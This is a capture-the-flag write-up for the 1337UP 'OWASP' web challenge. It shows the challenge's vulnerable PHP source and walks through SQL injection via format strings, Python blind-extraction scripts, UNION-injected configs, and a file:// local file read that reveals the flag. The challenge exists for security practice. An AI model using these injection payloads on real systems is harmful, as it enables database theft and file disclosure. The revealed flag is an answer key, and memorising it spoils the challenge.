---
title: "1337UP web/OWASP"
publishDate: "20 Nov 2023"
description: "Author: cpp.dog"
tags: ["web", "1337up"]
---

#### Description

Everyone knows the OWASP top 10 are vulnerable, I guess this might be too 💀

Author: Ivars Vids

#### Code inspection

Sourceless.

P.S.
After CTF has ended, some participants shared the dirbusted source file.
`https://owasp.ctf.intigriti.io/search.php.save`

Please note, I didn't knew about this file, because dirbusting is taboo on most CTFs, if it's not stated in the challenge description. 

So I was desperately guessing every possible shit out there.
```php
<?php
require_once('db.php');
$flag = file_get_contents('/flag.txt');
@include('header.php');

//build sql query
$sql = 'select * from owasp';
$sql_where = '';
foreach ($_REQUEST as $field => $value){
  if ($sql_where) $sql_where = " AND $sql_where";
  $sql_where = "position(%s in $field) $sql_where";
  try {
    $sql_where = @vsprintf($sql_where, Array("'". sqlesc($value) . "'"));
  } catch (ValueError | TypeError $e) {
    $sql_where = '';
  }
  if (preg_match('/[^a-z0-9\.\-_]/i', $field)) die ('Hacking attempt!');
}
$sql .= ($sql_where)?" where $sql_where":'';

foreach(sqlquery($sql) as $row){
  @include('row.php');
  $config = json_decode($row['config'], true);
}

if (isset($config['flag']) && $config['flag']){
  $url = $config['url'];
  // no printer manufacturer domains
  if (preg_match('/canon|epson|brother|hp|minolta|sharp|dell|oki|samsung|xerox|lexmark/i', $url)) die('Looks like a printer!');
//  $url = 'https://www.youtube.com/watch?v=2U3Faa3DejQ';
  if (filter_var($url, FILTER_VALIDATE_URL)) {
    $http_resp = file_get_contents($url);
    var_dump($http_resp);
    if ($flag === $http_resp){
      die('Yes! You got the right flag!');
    }
    die('Wrong flag');
  }
  else {
    die('URL does not start with HTTP or HTTPS protocol!');
  }
}

@include('footer.php');
```

#### Fuzzing

We don't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GET's the search.php

`https://owasp.ctf.intigriti.io/search.php?title=1`

SQL injection is definetely first thing to try here, so let's try something:

`https://owasp.ctf.intigriti.io/search.php?title='"/`

No errors out here what if we add another random query parameter?

`https://owasp.ctf.intigriti.io/search.php?title=%27%22%2F&abacaba=123`

And here we are, definetely SQL injection

```py
Fatal error: Uncaught mysqli_sql_exception: Unknown column 'abacaba' in 'where clause' in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

But after some tries we have found out that query string parameters can only contain something matching this regex `/[a-z0-9_-]/i`, dots and spaces are being replaced to underscores `_`. But since we have `-` not banned we can try to abuse it and comment query to see at least part of it in order to understand what to do next.

`https://owasp.ctf.intigriti.io/search.php?b=1&1=321&--=123`

```py
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ') AND position('321' in 1) AND position('1' in b)' at line 1 in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

So it adds `AND position('value' in key)` for every query parameter in reversed order. Interesting. Looks like we can try format string injection out here.

`https://owasp.ctf.intigriti.io/search.php?a=%1$s)  AND 0;--&id=1`

```py
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1') AND 0;--' in a)' at line 1 in /var/www/html/db.php:11 
Stack trace: 
#0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
```

We were right about format string injection! Hm, looks like we need to add opening parenthesis before the format string and prefix second parameter with `in title)` in order to get something good.

`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR 0 AND POSITION(`

Above payload returns empty article set, now we can extract everything.
After some information_schema.tables iteration we've found that there's another table called flag, with column flag. Let's dump it!

```py
from cr3.web.brute import trie_brute
from cr3.regex.solver import solve

def callback(flag, c, _):
  return None, f"https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR (SELECT COUNT(flag) FROM flag where HEX(SUBSTR(flag,{len(flag) + 1},1)) = HEX({hex(ord(c))})) > 0 AND POSITION("

flag = trie_brute(success="<h3>", pre_request_callback=callback)
```

`https://www.youtube.com/watch?v=dQw4w9WgXcQ`

And here we go, rickroll...

Well, we've also found additional column in article table named `config`. Let's dump it too.

```py
from cr3.web.brute import trie_brute
from cr3.regex.solver import solve

def callback(flag, c, _):
  return None, f"https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR (SELECT GROUP_CONCAT(config) FROM owasp where HEX(SUBSTR(config,{len(flag) + 1},1)) = HEX({hex(ord(c))})) > 0 AND POSITION("

flag = trie_brute(success="<h3>", pre_request_callback=callback)
```

```json
{}, {"__proto__":{"flag": "https://www.youtube.com/watch?v=Ct6BUPvE2sM"}}, {}, {"flag":false}, {}, [], 1337, "1337UP", null
```

It's JSON and there's new youtube link with another rickroll. 
`https://www.youtube.com/watch?v=Ct6BUPvE2sM`

But what happens if we'll give our own config, with something like this `{"flag":true}`?

`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275657D;-- AND POSITION(`

```py
Warning: Undefined array key "url" in /var/www/html/search.php on line 27

Deprecated: preg_match(): Passing null to parameter 
#2 ($subject) of type string is deprecated in /var/www/html/search.php on line 29
URL does not start with HTTP or HTTPS protocol!
```

Let's try passing this value: `{"flag":true,"url":"link-to-webhooks"}`.
`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275652C2275726C223A2268747470733A2F2F776562686F6F6B2E736974652F32623037613133312D646534362D343135332D626561662D343036633265353831396132227D;-- AND POSITION(`

```py
string(140) 
"This URL has no default content configured. View in Webhook.site." 
Wrong flag
```

Hmm, let's try LFI:
`https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275652C2275726C223A2266696C653A2F2F2F666C61672E747874227D;-- AND POSITION(`

```py
string(40) 
"INTIGRITI{php_n4n0_5ql1_lf1_53cr37_fl46}" 
Yes! You got the right flag!
```

#### Flag
`INTIGRITI{php_n4n0_5ql1_lf1_53cr37_fl46}`